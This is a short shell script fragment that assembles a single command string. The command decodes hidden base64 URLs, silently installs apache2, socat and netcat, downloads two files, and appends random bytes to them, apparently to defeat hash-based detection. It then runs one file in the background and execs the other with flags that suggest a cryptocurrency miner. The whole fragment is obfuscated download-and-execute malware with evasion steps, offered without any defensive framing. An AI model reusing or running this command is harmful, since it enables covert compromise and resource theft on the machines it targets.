# Create the complete command as ONE string
COMPLETE_COMMAND="${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENCODED}' | base64 -d) && ${VAR7}=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && dd if=/dev/urandom of=\${${VAR1}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && dd if=/dev/urandom of=\${${VAR2}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && exec ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}}"

